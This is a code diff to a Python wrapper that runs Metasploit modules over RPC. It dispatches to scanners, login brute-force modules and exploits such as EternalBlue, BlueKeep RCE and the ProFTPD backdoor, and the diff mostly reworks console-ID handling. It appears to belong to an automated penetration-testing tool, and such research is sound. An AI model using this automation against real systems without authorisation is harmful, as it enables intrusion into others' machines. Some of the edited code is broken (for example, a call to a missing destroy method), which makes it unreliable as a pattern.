@@ -13,57 +13,68 @@ class MetasploitInterface:
         self.metasploit_port = metasploit_port
         self.metasploit_pass = metasploit_pass
         self.client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
+        self.cid = self.client.consoles.console().cid
         # self.verbosity = verbosity
         print(f"MSFRPCD API Connected @ {self.metasploit_ip}:{self.metasploit_port}")
         print(f"MSFRPCD OBJ: {self.client}")
 
+    def reset(self):
+        try:
+            self.client.consoles.console(self.cid).destroy
+        except:
+            print('error')
+            pass
+        
+        self.cid = self.client.consoles.console().cid
+
     def run(self, target, exploit, port): # This will just take in the info and use it   - does it just turn into self.client.etc?
         success, user_level, results = False, '', ''
         # switch statement to select exploit
-        if(exploit == 'auxiliary/scanner/ftp/anonymous'):
-            success, user_level, results = self.scanFTPAnon(target, exploit, port)
+        try:
+            if(exploit == 'auxiliary/scanner/ftp/anonymous'):
+                success, user_level, results = self.scanFTPAnon(target, exploit, port)
 
-        elif(exploit == 'auxiliary/scanner/ftp/ftp_login'):
-            success, user_level, results = self.scanFTPLogin(target, exploit, port)
+            elif(exploit == 'auxiliary/scanner/ftp/ftp_login'):
+                success, user_level, results = self.scanFTPLogin(target, exploit, port)
 
-        elif(exploit == 'auxiliary/scanner/ftp/ftp_version'):
-            success, user_level, results = self.scanFTPversion(target, exploit, port)
+            elif(exploit == 'auxiliary/scanner/ftp/ftp_version'):
+                success, user_level, results = self.scanFTPversion(target, exploit, port)
 
-        elif(exploit == 'exploit/unix/ftp/proftpd_133c_backdoor'):
-            success, user_level, results = self.exploitFTP(target, exploit, port)
+            elif(exploit == 'exploit/unix/ftp/proftpd_133c_backdoor'):
+                success, user_level, results = self.exploitFTP(target, exploit, port)
 
-        elif(exploit == 'auxiliary/scanner/smb/smb_ms17_010'):
-            success, user_level, results = self.scanEternalBlue(target, exploit, port)
+            elif(exploit == 'auxiliary/scanner/smb/smb_ms17_010'):
+                success, user_level, results = self.scanEternalBlue(target, exploit, port)
 
-        elif(exploit == 'exploit/windows/smb/ms17_010_eternalblue'):
-            success, user_level, results = self.exploitEternalBlue(target, exploit, port)
+            elif(exploit == 'exploit/windows/smb/ms17_010_eternalblue'):
+                success, user_level, results = self.exploitEternalBlue(target, exploit, port)
 
-        elif(exploit == 'auxiliary/scanner/rdp/rdp_scanner'):
-            success, user_level, results = self.rdpScanner(target, exploit, port)
+            elif(exploit == 'auxiliary/scanner/rdp/rdp_scanner'):
+                success, user_level, results = self.rdpScanner(target, exploit, port)
 
-        elif(exploit == 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'):
-            success, user_level, results = self.scanBlueKeep(target, exploit, port)
-        
-        elif(exploit == 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce'):
-            success, user_level, results = self.exploitBlueKeep(target, exploit, port)
+            elif(exploit == 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'):
+                success, user_level, results = self.scanBlueKeep(target, exploit, port)
+            
+            elif(exploit == 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce'):
+                success, user_level, results = self.exploitBlueKeep(target, exploit, port)
 
-        elif(exploit == 'auxiliary/scanner/ssh/ssh_login'):
-            success, user_level, results = self.scanSSHlogin(target, exploit, port)
-        
-        elif(exploit == 'auxiliary/scanner/ssh/ssh_version'):
-            success, user_level, results = self.scanSSHversion(target, exploit, port)
+            elif(exploit == 'auxiliary/scanner/ssh/ssh_login'):
+                success, user_level, results = self.scanSSHlogin(target, exploit, port)
+            
+            elif(exploit == 'auxiliary/scanner/ssh/ssh_version'):
+                success, user_level, results = self.scanSSHversion(target, exploit, port)
 
-        elif(exploit == 'auxiliary/scanner/smb/smb_version'):
-            success, user_level, results = self.scanSMBversion(target, exploit, port)
+            elif(exploit == 'auxiliary/scanner/smb/smb_version'):
+                success, user_level, results = self.scanSMBversion(target, exploit, port)
 
-        elif(exploit == 'auxiliary/scanner/smb/smb_login'):
-            success, user_level, results = self.scanSMBlogin(target, exploit, port)
-
-        # elif(exploit == 'exploit/windows/smb/psexec'):
-        #     success, user_level, results = self.exploitSMBpsexec(target,exploit,port)
-
-        else:
-            print(f"{exploit}: Not implemented")
+            elif(exploit == 'auxiliary/scanner/smb/smb_login'):
+                success, user_level, results = self.scanSMBlogin(target, exploit, port)
+            else:
+                print(f"{exploit}: Not implemented")
+                return 0, "", ""
+        except:
+            print('sessionID being reset action failed')
+            self.destroy()
             return 0, "", ""
         
         return success, user_level, results
@@ -87,9 +98,8 @@ class MetasploitInterface:
         
         
         """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT RESULTS"""
-        cid = self.client.consoles.console().cid
         
-        results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit, payload=payload)
 
         if self.verbosity == "INFO":
                 print(results)
@@ -130,10 +140,10 @@ class MetasploitInterface:
             user_level = ""
             success = False
 
-        
-        self.client.sessions.session(number).stop()
-        print(self.client.sessions.list)
-        self.client.consoles.console(cid).destroy
+        try:
+            self.client.sessions.session(number).stop()
+        except Exception:
+            pass
         self.portBindings.remove(localPort)
         
         return success, user_level, results
@@ -151,8 +161,7 @@ class MetasploitInterface:
         exploit["RPORT"] = port
        
         """ CREATION OF CONSOLE, EXPLOIT RUN AND RESULTS RETURNED"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         
         if self.verbosity == "INFO":
             print(results)
@@ -171,7 +180,7 @@ class MetasploitInterface:
                 print(f'Success: {success}')
                 print(f'User Level: {user_level}')
 
-        self.client.consoles.console(cid).destroy
+        # self.client.consoles.console(self.cid).destroy
 
         return success, user_level, results
 
@@ -196,8 +205,7 @@ class MetasploitInterface:
         payload['LPORT'] = localPort
         
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit, payload=payload)
         if self.verbosity == "INFO":
                 print(results)
         
@@ -237,8 +245,11 @@ class MetasploitInterface:
                 print(f"There was an error with Eternal Blue (see below) \n {e}")
             user_level = ""
             success = False
-        self.client.sessions.session(number).stop()
-        self.client.consoles.console(cid).destroy
+        try:
+            self.client.sessions.session(number).stop()
+        except Exception:
+            pass
+        
         self.portBindings.remove(localPort)
 
         return success, user_level, results
@@ -254,8 +265,7 @@ class MetasploitInterface:
         exploit["RPORT"] = port
 
         """ CREATES CONSOLE & RUNS EXPLOIT"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         if self.verbosity == "INFO":
             print(results)
         
@@ -270,7 +280,6 @@ class MetasploitInterface:
             success = False
             user_level = ""
 
-        self.client.consoles.console(cid).destroy
 
         return success, user_level, results
 
@@ -288,8 +297,7 @@ class MetasploitInterface:
         # exploit["LHOST"] = LHOSTIP
 
         """ CREATES EXPLOIT & RUNS EXECUTION"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         if self.verbosity == "INFO":
                 print(results)
         # number = -1
@@ -313,7 +321,7 @@ class MetasploitInterface:
         #     user_level = ""
         #     success = False
         
-        # self.client.consoles.console(cid).destroy
+        # self.client.consoles.console(self.cid).destroy
         
         return success, user_level, results
         
@@ -332,9 +340,9 @@ class MetasploitInterface:
         exploit["STOP_ON_SUCCESS"] = True
 
         """ CREATES CONSOLE & RUNS EXPLOIT"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        print(type(results))
+        # self.cid = self.client.consoles.console().cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+
         if self.verbosity == "INFO":
             print(results)
             
@@ -354,7 +362,7 @@ class MetasploitInterface:
                 print(f"User_Level: {user_level}")
                
 
-        self.client.consoles.console(cid).destroy
+        # self.client.consoles.console(self.cid).destroy
 
         return success, user_level, results
 
@@ -369,8 +377,8 @@ class MetasploitInterface:
         exploit["RPORT"] = port
 
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         if self.verbosity == "INFO":
             print(results)
 
@@ -398,8 +406,8 @@ class MetasploitInterface:
         exploit["RPORT"] = port
 
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         if self.verbosity == "INFO":
             print(results)
 
@@ -424,8 +432,8 @@ class MetasploitInterface:
 
 
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         if self.verbosity == "INFO":
             print(results)
 
@@ -454,8 +462,8 @@ class MetasploitInterface:
         exploit["RHOSTS"] = target
        
         """CREATES CONSOLE & EXECUTES EXPLOIT"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         if self.verbosity == "INFO":
             print(results)
 
@@ -480,8 +488,8 @@ class MetasploitInterface:
         exploit["STOP_ON_SUCCESS"] = True
 
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         if self.verbosity == "INFO":
                 print(results)
 
@@ -568,9 +576,12 @@ class MetasploitInterface:
             user_level = ""
             success = False
 
+        try:
+            self.client.sessions.session(number).stop()
+        except Exception:
+            pass
         
-        self.client.sessions.session(number).stop()
-        self.client.consoles.console(cid).destroy
+        # self.client.consoles.console(self.cid).destroy
        
         return success, user_level, results
         
@@ -587,8 +598,8 @@ class MetasploitInterface:
 
 
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         if self.verbosity == "INFO":
             print(results)
 
@@ -612,8 +623,8 @@ class MetasploitInterface:
         exploit["RPORT"] = port
 
         """ CREATES CONSOLE AND EXECUTES MODULE"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
         if self.verbosity == "INFO":
             print(results)
 
@@ -651,9 +662,9 @@ class MetasploitInterface:
         payload["EXITFUNC"] = 'thread'
         
         """ CREATES CONSOLE & EXECUTES EXPLOIT ERROR HANDLING"""
-        cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
-        print(self.client.sessions.list)
+        # self.cid = self.client.consoles.console().self.cid
+        results = self.client.consoles.console(self.cid).run_module_with_output(exploit, payload=payload)
+        # print(self.client.sessions.list)
         if self.verbosity == "INFO":
                 print(results)
         number = -1
@@ -687,9 +698,11 @@ class MetasploitInterface:
             user_level = ""
             success = False
             
-        self.client.sessions.session(number).stop()
-
-        self.client.consoles.console(cid).destroy
+        try:
+            self.client.sessions.session(number).stop()
+        except Exception:
+            pass
+        # self.client.consoles.console(self.cid).destroy
 
         return success, user_level, results
 
